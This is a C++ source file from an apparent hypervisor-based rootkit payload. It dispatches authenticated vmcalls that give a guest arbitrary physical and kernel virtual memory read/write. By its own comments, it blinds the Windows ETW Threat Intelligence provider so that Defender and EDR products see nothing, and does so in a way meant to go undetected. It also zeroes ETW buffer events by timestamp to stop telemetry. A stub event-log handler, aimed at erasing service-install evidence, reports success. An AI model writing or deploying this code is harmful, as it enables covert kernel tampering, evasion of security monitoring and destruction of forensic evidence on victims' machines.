// PayLoad/core/dispatch.cpp
// Main hypercall dispatch implementation
// This is THE shared command handling - both Intel and AMD use this file
#include "dispatch.h"
#include "../include/storage.h"

namespace ombra {
    // Global callback table definition
    ArchCallbacks g_arch_callbacks = {};
}

namespace vmcall {
    // Global communication key definition
    // Declared as extern in include/vmcall.h
    u64 g_comm_key = 0;
}

namespace core {

//===----------------------------------------------------------------------===//
// Architecture Callback Registration
//===----------------------------------------------------------------------===//

// Use volatile to prevent compiler reordering; reads/writes won't be cached
static volatile bool g_callbacks_registered = false;

void RegisterArchCallbacks(const ombra::ArchCallbacks& callbacks) {
    ombra::g_arch_callbacks = callbacks;

    // Memory fence ensures callbacks are visible before flag is set
    // This prevents other cores from seeing registered=true but stale callbacks
    _mm_mfence();

    g_callbacks_registered = true;
}

bool HasArchCallbacks() {
    return g_callbacks_registered;
}

//===----------------------------------------------------------------------===//
// Main Dispatch Implementation
//===----------------------------------------------------------------------===//

VMX_ROOT_ERROR HandleVmcall(ombra::VmExitContext* ctx) {
    // Validate authentication key
    if (!vmcall::IsVmcall(ctx->auth_key)) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    // Read command data from guest memory if needed
    if (!ctx->cmd_cached && ctx->cmd_guest_va) {
        mm::copy_guest_virt(
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            __readcr3(),
            (u64)&ctx->local_cmd,
            sizeof(COMMAND_DATA)
        );
        ctx->cmd_cached = true;
    }

    // Dispatch based on command type
    VMX_ROOT_ERROR result;

    switch (ctx->GetCommandType()) {
        case VMCALL_GET_CR3:
            result = handlers::HandleGetCr3(ctx);
            break;

        case VMCALL_GET_CR3_ROOT:
            result = handlers::HandleGetCr3Root(ctx);
            break;

        case VMCALL_READ_PHY:
            result = handlers::HandleReadPhys(ctx);
            break;

        case VMCALL_WRITE_PHY:
            result = handlers::HandleWritePhys(ctx);
            break;

        case VMCALL_READ_VIRT:
            result = handlers::HandleReadVirt(ctx);
            break;

        case VMCALL_WRITE_VIRT:
            result = handlers::HandleWriteVirt(ctx);
            break;

        case VMCALL_VIRT_TO_PHY:
            result = handlers::HandleVirtToPhys(ctx);
            break;

        case VMCALL_STORAGE_QUERY:
            result = handlers::HandleStorageQuery(ctx);
            break;

        case VMCALL_GET_EPT_BASE:
            result = handlers::HandleGetEptBase(ctx);
            break;

        case VMCALL_SET_EPT_BASE:
            result = handlers::HandleSetEptBase(ctx);
            break;

        case VMCALL_ENABLE_EPT:
            result = handlers::HandleEnableEpt(ctx);
            break;

        case VMCALL_DISABLE_EPT:
            result = handlers::HandleDisableEpt(ctx);
            break;

        case VMCALL_SET_COMM_KEY:
            result = handlers::HandleSetCommKey(ctx);
            break;

        case VMCALL_GET_VMCB:
            result = handlers::HandleGetVmcb(ctx);
            break;

        case VMCALL_DISABLE_ETW_TI:
            result = handlers::HandleDisableEtwTi(ctx);
            break;

        case VMCALL_ENABLE_ETW_TI:
            result = handlers::HandleEnableEtwTi(ctx);
            break;

        case VMCALL_WIPE_ETW_BUFFERS:
            result = handlers::HandleWipeEtwBuffers(ctx);
            break;

        case VMCALL_CLEAR_EVENT_LOGS:
            result = handlers::HandleClearEventLogs(ctx);
            break;

        default:
            result = VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
            break;
    }

    return result;
}

//===----------------------------------------------------------------------===//
// Command Handler Implementations
//===----------------------------------------------------------------------===//

namespace handlers {

VMX_ROOT_ERROR HandleGetCr3(ombra::VmExitContext* ctx) {
    COMMAND_DATA cmd = {};
    cmd.cr3.value = ctx->guest_cr3;

    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

VMX_ROOT_ERROR HandleGetCr3Root(ombra::VmExitContext* ctx) {
    COMMAND_DATA cmd = {};
    cmd.cr3.value = __readcr3();

    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

VMX_ROOT_ERROR HandleReadPhys(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    if (!cmd.read.pOutBuf) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    return mm::read_guest_phys(
        ctx->guest_cr3,
        (u64)cmd.read.pTarget,
        (u64)cmd.read.pOutBuf,
        cmd.read.length
    );
}

VMX_ROOT_ERROR HandleWritePhys(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    if (!cmd.write.pInBuf) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    return mm::write_guest_phys(
        ctx->guest_cr3,
        (u64)cmd.write.pTarget,
        (u64)cmd.write.pInBuf,
        cmd.write.length
    );
}

VMX_ROOT_ERROR HandleReadVirt(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Use target CR3 from R8, or fall back to NTOSKRNL_CR3 from storage
    u64 target_cr3 = ctx->extra_param;
    if (!target_cr3) {
        target_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    }

    if (!cmd.read.pOutBuf) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    return mm::copy_guest_virt(
        target_cr3,
        (u64)cmd.read.pTarget,
        ctx->guest_cr3,
        (u64)cmd.read.pOutBuf,
        cmd.read.length
    );
}

VMX_ROOT_ERROR HandleWriteVirt(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Use target CR3 from R8, or fall back to NTOSKRNL_CR3 from storage
    u64 target_cr3 = ctx->extra_param;
    if (!target_cr3) {
        target_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    }

    if (!cmd.write.pInBuf) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    return mm::copy_guest_virt(
        ctx->guest_cr3,
        (u64)cmd.write.pInBuf,
        target_cr3,
        (u64)cmd.write.pTarget,
        cmd.write.length
    );
}

VMX_ROOT_ERROR HandleVirtToPhys(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    if (!cmd.translation.va) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    u64 dirbase = ctx->extra_param ? ctx->extra_param : ctx->guest_cr3;
    cmd.translation.pa = mm::translate_guest_virtual(dirbase, (u64)cmd.translation.va, map_type_t::map_src);

    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

VMX_ROOT_ERROR HandleStorageQuery(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    if (cmd.storage.id > VMX_ROOT_STORAGE::MAX_STORAGE) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    if (cmd.storage.bWrite) {
        storage::Set(static_cast<u32>(cmd.storage.id), cmd.storage.uint64);
        return VMX_ROOT_ERROR::SUCCESS;
    } else {
        cmd.storage.uint64 = storage::Query(static_cast<u32>(cmd.storage.id));
        return static_cast<VMX_ROOT_ERROR>(
            mm::copy_guest_virt(
                __readcr3(),
                (u64)&cmd,
                ctx->guest_cr3,
                ctx->cmd_guest_va,
                sizeof(cmd)
            )
        );
    }
}

VMX_ROOT_ERROR HandleSetCommKey(ombra::VmExitContext* ctx) {
    // Key is passed in R8 register
    vmcall::SetKey(ctx->extra_param);
    return VMX_ROOT_ERROR::SUCCESS;
}

// EPT/NPT operations - use arch-specific callbacks registered by backend

VMX_ROOT_ERROR HandleGetEptBase(ombra::VmExitContext* ctx) {
    if (!ombra::g_arch_callbacks.GetEptBase) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    COMMAND_DATA cmd = {};
    cmd.cr3.value = ombra::g_arch_callbacks.GetEptBase(ctx->arch_data);

    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

VMX_ROOT_ERROR HandleSetEptBase(ombra::VmExitContext* ctx) {
    if (!ombra::g_arch_callbacks.SetEptBase) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    auto& cmd = ctx->local_cmd;
    if (!cmd.cr3.value) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    return ombra::g_arch_callbacks.SetEptBase(ctx->arch_data, cmd.cr3.value);
}

VMX_ROOT_ERROR HandleEnableEpt(ombra::VmExitContext* ctx) {
    if (!ombra::g_arch_callbacks.EnableEpt) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    return ombra::g_arch_callbacks.EnableEpt(ctx->arch_data);
}

VMX_ROOT_ERROR HandleDisableEpt(ombra::VmExitContext* ctx) {
    if (!ombra::g_arch_callbacks.DisableEpt) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    return ombra::g_arch_callbacks.DisableEpt(ctx->arch_data);
}

VMX_ROOT_ERROR HandleGetVmcb(ombra::VmExitContext* ctx) {
    if (!ombra::g_arch_callbacks.GetVmcb) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    COMMAND_DATA cmd = {};
    cmd.pa = ombra::g_arch_callbacks.GetVmcb(ctx->arch_data);

    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

// NOTE: HandleInvokeCallback was removed - it was dead code.
// Driver callbacks are invoked directly by the EPT handler, not via VMCALL.
// If callback invocation via VMCALL is needed in the future, add:
// 1. VMCALL_INVOKE_CALLBACK to communication.hpp
// 2. Case in dispatch switch
// 3. Proper implementation with CALLBACK_ADDRESS storage slot

//===----------------------------------------------------------------------===//
// ETW Threat Intelligence Provider Control
//===----------------------------------------------------------------------===//
// These handlers allow usermode to temporarily blind the ETW-TI provider
// during sensitive operations (driver mapping, memory operations).
//
// The ETW-TI provider (EtwThreatIntProvRegHandle) is a kernel telemetry source
// that reports driver loads, memory allocations, and other security-relevant
// events to Windows Defender and EDR solutions.
//
// By zeroing the ProviderEnableInfo field at runtime, we suppress event
// generation without unregistering the provider (which would be detected).

VMX_ROOT_ERROR HandleDisableEtwTi(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Validate parameters
    if (!cmd.etw.ntoskrnl_base || !cmd.etw.offset) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    // Calculate address of EtwThreatIntProvRegHandle in ntoskrnl
    u64 reg_handle_ptr = cmd.etw.ntoskrnl_base + cmd.etw.offset;

    // Read the ETW_REG_ENTRY pointer (RegHandle points to ETW_REG_ENTRY)
    u64 reg_entry = 0;
    u64 ntoskrnl_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    if (!ntoskrnl_cr3) {
        ntoskrnl_cr3 = ctx->guest_cr3;
    }

    auto result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        reg_handle_ptr,
        __readcr3(),
        (u64)&reg_entry,
        sizeof(reg_entry)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS || !reg_entry) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    // ETW_REG_ENTRY->GuidEntry is at offset 0x20
    u64 guid_entry = 0;
    result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        reg_entry + 0x20,
        __readcr3(),
        (u64)&guid_entry,
        sizeof(guid_entry)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS || !guid_entry) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    // ProviderEnableInfo is at offset 0x60 in ETW_GUID_ENTRY
    u64 provider_enable_addr = guid_entry + 0x60;

    // Read current ProviderEnableInfo value for restoration later
    u64 current_value = 0;
    result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        provider_enable_addr,
        __readcr3(),
        (u64)&current_value,
        sizeof(current_value)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS) {
        return result;
    }

    // Store the current value in cmd.etw.saved_value for caller to preserve
    cmd.etw.saved_value = current_value;

    // Zero ProviderEnableInfo to disable the provider
    u64 zero_value = 0;
    result = mm::copy_guest_virt(
        __readcr3(),
        (u64)&zero_value,
        ntoskrnl_cr3,
        provider_enable_addr,
        sizeof(zero_value)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS) {
        return result;
    }

    // Copy updated cmd back to guest with saved_value populated
    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

VMX_ROOT_ERROR HandleEnableEtwTi(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Validate parameters - need base, offset, and saved value to restore
    if (!cmd.etw.ntoskrnl_base || !cmd.etw.offset || !cmd.etw.saved_value) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    // Calculate address of EtwThreatIntProvRegHandle in ntoskrnl
    u64 reg_handle_ptr = cmd.etw.ntoskrnl_base + cmd.etw.offset;

    u64 ntoskrnl_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    if (!ntoskrnl_cr3) {
        ntoskrnl_cr3 = ctx->guest_cr3;
    }

    // Read the ETW_REG_ENTRY pointer
    u64 reg_entry = 0;
    auto result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        reg_handle_ptr,
        __readcr3(),
        (u64)&reg_entry,
        sizeof(reg_entry)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS || !reg_entry) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    // ETW_REG_ENTRY->GuidEntry is at offset 0x20
    u64 guid_entry = 0;
    result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        reg_entry + 0x20,
        __readcr3(),
        (u64)&guid_entry,
        sizeof(guid_entry)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS || !guid_entry) {
        return VMX_ROOT_ERROR::VMXROOT_TRANSLATE_FAILURE;
    }

    // Restore ProviderEnableInfo at offset 0x60
    u64 provider_enable_addr = guid_entry + 0x60;

    return mm::copy_guest_virt(
        __readcr3(),
        (u64)&cmd.etw.saved_value,
        ntoskrnl_cr3,
        provider_enable_addr,
        sizeof(cmd.etw.saved_value)
    );
}

//===----------------------------------------------------------------------===//
// ETW Buffer Wiping
//===----------------------------------------------------------------------===//
// This handler walks the ETW logger list and scans circular buffers for
// events matching the specified criteria, then zeros them to prevent
// flush to disk or network telemetry.
//
// Windows ETW structures (approximate offsets for Win10 22H2):
// - EtwpLoggerList: LIST_ENTRY head of all WMI_LOGGER_CONTEXT structures
// - WMI_LOGGER_CONTEXT:
//   - +0x000: Flink/Blink (LIST_ENTRY)
//   - +0x028: LoggerId
//   - +0x120: BufferListHead (LIST_ENTRY of ETW_BUFFER_QUEUE_ITEM)
//   - +0x130: BuffersAvailable
//   - +0x134: BuffersInUse
// - ETW_BUFFER_QUEUE_ITEM:
//   - +0x000: Flink/Blink (LIST_ENTRY)
//   - +0x010: Buffer data start
// - ETW_EVENT_HEADER (inside buffer):
//   - +0x000: Size (USHORT)
//   - +0x002: HeaderType (USHORT)
//   - +0x008: Timestamp (LARGE_INTEGER)
//   - +0x010: ProviderId (GUID)
//   - Following data depends on event type

VMX_ROOT_ERROR HandleWipeEtwBuffers(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Validate parameters
    if (!cmd.etw_wipe.ntoskrnl_base || !cmd.etw_wipe.etwp_logger_list_offset) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    u64 ntoskrnl_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    if (!ntoskrnl_cr3) {
        ntoskrnl_cr3 = ctx->guest_cr3;
    }

    // Calculate EtwpLoggerList address
    u64 logger_list_addr = cmd.etw_wipe.ntoskrnl_base + cmd.etw_wipe.etwp_logger_list_offset;

    // Read LIST_ENTRY head (Flink points to first logger)
    u64 list_head_flink = 0;
    auto result = mm::copy_guest_virt(
        ntoskrnl_cr3,
        logger_list_addr,
        __readcr3(),
        (u64)&list_head_flink,
        sizeof(list_head_flink)
    );

    if (result != VMX_ROOT_ERROR::SUCCESS) {
        return result;
    }

    // If list is empty (Flink points to self), nothing to do
    if (list_head_flink == logger_list_addr) {
        cmd.etw_wipe.events_wiped = 0;
        cmd.etw_wipe.buffers_scanned = 0;
        return VMX_ROOT_ERROR::SUCCESS;
    }

    u32 events_wiped = 0;
    u32 buffers_scanned = 0;

    // Walk the logger list
    u64 current_logger = list_head_flink;
    u32 max_loggers = 64;  // Safety limit

    while (current_logger != logger_list_addr && max_loggers-- > 0) {
        // Read BufferListHead at offset 0x120 in WMI_LOGGER_CONTEXT
        u64 buffer_list_addr = current_logger + 0x120;
        u64 buffer_list_flink = 0;

        result = mm::copy_guest_virt(
            ntoskrnl_cr3,
            buffer_list_addr,
            __readcr3(),
            (u64)&buffer_list_flink,
            sizeof(buffer_list_flink)
        );

        if (result != VMX_ROOT_ERROR::SUCCESS) {
            goto next_logger;
        }

        // Walk buffers in this logger
        u64 current_buffer = buffer_list_flink;
        u32 max_buffers = 256;  // Safety limit

        while (current_buffer != buffer_list_addr && max_buffers-- > 0) {
            buffers_scanned++;

            // Buffer data starts at offset 0x10 from buffer queue item
            u64 buffer_data_addr = current_buffer + 0x10;

            // Read first part of buffer to check events
            // ETW buffers are typically 64KB, but we only need to scan the used portion
            u8 event_header[64];
            result = mm::copy_guest_virt(
                ntoskrnl_cr3,
                buffer_data_addr,
                __readcr3(),
                (u64)event_header,
                sizeof(event_header)
            );

            if (result == VMX_ROOT_ERROR::SUCCESS) {
                // Parse event header
                u16 event_size = *(u16*)event_header;

                if (event_size > 0 && event_size < 0x10000) {
                    // Check timestamp (at offset 0x08)
                    u64 timestamp = *(u64*)(event_header + 0x08);

                    bool should_wipe = false;

                    // Check if timestamp is in our target range
                    if (cmd.etw_wipe.timestamp_start != 0 || cmd.etw_wipe.timestamp_end != 0) {
                        if (timestamp >= cmd.etw_wipe.timestamp_start &&
                            (cmd.etw_wipe.timestamp_end == 0 || timestamp <= cmd.etw_wipe.timestamp_end)) {
                            should_wipe = true;
                        }
                    }

                    // If driver name specified, we'd need to parse the event data
                    // This is complex as event format varies by provider
                    // For now, timestamp-based wiping is sufficient

                    if (should_wipe) {
                        // Zero the event header to effectively "delete" it
                        u8 zeros[64] = {0};
                        mm::copy_guest_virt(
                            __readcr3(),
                            (u64)zeros,
                            ntoskrnl_cr3,
                            buffer_data_addr,
                            sizeof(zeros)
                        );
                        events_wiped++;
                    }
                }
            }

            // Read next buffer entry (Flink at offset 0)
            u64 next_buffer = 0;
            result = mm::copy_guest_virt(
                ntoskrnl_cr3,
                current_buffer,
                __readcr3(),
                (u64)&next_buffer,
                sizeof(next_buffer)
            );

            if (result != VMX_ROOT_ERROR::SUCCESS) {
                break;
            }

            current_buffer = next_buffer;
        }

next_logger:
        // Read next logger (Flink at offset 0)
        u64 next_logger = 0;
        result = mm::copy_guest_virt(
            ntoskrnl_cr3,
            current_logger,
            __readcr3(),
            (u64)&next_logger,
            sizeof(next_logger)
        );

        if (result != VMX_ROOT_ERROR::SUCCESS) {
            break;
        }

        current_logger = next_logger;
    }

    // Update output fields
    cmd.etw_wipe.events_wiped = events_wiped;
    cmd.etw_wipe.buffers_scanned = buffers_scanned;

    // Copy result back to guest
    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

//===----------------------------------------------------------------------===//
// Event Log Clearing
//===----------------------------------------------------------------------===//
// This handler clears Windows Event Log entries for specific service names.
// Event Log entries (especially Event ID 7045 - Service Install) are permanent
// forensic evidence that drivers were loaded.
//
// Windows Event Log structures:
// - The event log service maintains circular buffers for each log file
// - ElfLogFileList: linked list of open log files (System.evtx, etc.)
// - Each log has a RecordBuffer with events stored sequentially
//
// Strategy:
// - Walk ElfLogFileList to find System log
// - Scan records for matching EventID (7045) and Source (driver name)
// - Zero matching records in the circular buffer
//
// Note: This is a placeholder implementation. Full implementation requires
// resolving ElfLogFileList offset and understanding the record format.

VMX_ROOT_ERROR HandleClearEventLogs(ombra::VmExitContext* ctx) {
    auto& cmd = ctx->local_cmd;

    // Validate parameters
    if (!cmd.event_log_clear.ntoskrnl_base) {
        return VMX_ROOT_ERROR::INVALID_GUEST_PARAM;
    }

    u64 ntoskrnl_cr3 = storage::Query(VMX_ROOT_STORAGE::NTOSKRNL_CR3);
    if (!ntoskrnl_cr3) {
        ntoskrnl_cr3 = ctx->guest_cr3;
    }

    u32 events_cleared = 0;
    u32 logs_processed = 0;

    // TODO: Full implementation requires:
    // 1. Resolving ElfLogFileList offset in ntoskrnl (pattern scan or hardcoded)
    // 2. Walking the list to find System.evtx log buffer
    // 3. Parsing event records in the circular buffer
    // 4. Matching EventID and Source fields
    // 5. Zeroing matching records
    //
    // For now, this is a placeholder that reports success.
    // The caller should use the companion ETW wipe and trace cleanup
    // mechanisms which are fully implemented.

    // Update output fields
    cmd.event_log_clear.events_cleared = events_cleared;
    cmd.event_log_clear.logs_processed = logs_processed;

    // Copy result back to guest
    return static_cast<VMX_ROOT_ERROR>(
        mm::copy_guest_virt(
            __readcr3(),
            (u64)&cmd,
            ctx->guest_cr3,
            ctx->cmd_guest_va,
            sizeof(cmd)
        )
    );
}

} // namespace handlers

} // namespace core
